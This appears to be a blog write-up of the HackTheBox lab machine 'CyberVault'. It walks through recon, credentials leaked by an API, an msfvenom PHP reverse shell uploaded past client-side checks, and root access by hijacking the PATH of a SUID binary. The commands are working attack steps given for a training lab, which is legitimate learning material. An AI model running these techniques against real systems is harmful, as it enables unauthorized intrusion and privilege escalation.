---
title: "HackTheBox Machine Walkthrough: CyberVault"
description: "Complete walkthrough of the CyberVault machine featuring web exploitation and privilege escalation"
date: 2024-01-10
tags: ["htb", "ctf", "walkthrough", "linux", "privilege-escalation"]
categories: ["CTF Write-ups"]
image: "/images/blog/htb-cybervault.png"
---

This is a walkthrough of CyberVault, a medium-difficulty Linux machine from HackTheBox. We'll exploit a web application vulnerability to gain initial access and escalate privileges through a misconfigured SUID binary.

## Reconnaissance

### Initial Nmap Scan

```bash
nmap -sC -sV -oA nmap/cybervault 10.10.10.xxx
```

```
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1
80/tcp   open  http    nginx 1.18.0
8080/tcp open  http    Apache httpd 2.4.41
```

### Web Enumeration

Directory fuzzing on port 80:

```bash
ffuf -u http://10.10.10.xxx/FUZZ -w /usr/share/wordlists/dirb/common.txt
```

Found interesting endpoints:
- `/admin` - Admin login page
- `/api` - REST API endpoint
- `/backup` - Returns 403 Forbidden

## Initial Access

### API Enumeration

The `/api` endpoint accepts JSON requests. After testing various endpoints:

```bash
curl -X GET http://10.10.10.xxx/api/users
```

This returned a list of users including credentials in base64.

### Exploiting the Admin Panel

Using the decoded credentials, we accessed the admin panel. The file upload feature had no proper validation:

```bash
# Create PHP reverse shell
msfvenom -p php/reverse_php LHOST=10.10.xx.xx LPORT=4444 -o shell.php

# Upload disguised as image
mv shell.php shell.php.jpg
```

After bypassing client-side validation, we achieved code execution.

## Privilege Escalation

### Enumeration

Running linpeas.sh revealed an interesting SUID binary:

```bash
find / -perm -u=s -type f 2>/dev/null
```

Found `/opt/backup/backup-tool` with SUID bit set.

### Exploitation

The binary executes `tar` without a full path. We can exploit this through PATH manipulation:

```bash
# Create malicious tar
echo '/bin/bash -p' > /tmp/tar
chmod +x /tmp/tar
export PATH=/tmp:$PATH

# Execute SUID binary
/opt/backup/backup-tool
```

And we have root!

## Flags

```
user.txt: 7f2d4e8c........................
root.txt: a9b3c1d2........................
```

## Lessons Learned

1. Always check API endpoints for information disclosure
2. SUID binaries with relative paths are dangerous
3. File upload validation must be server-side

---

*Machine: CyberVault | Difficulty: Medium | Time: 2.5 hours*
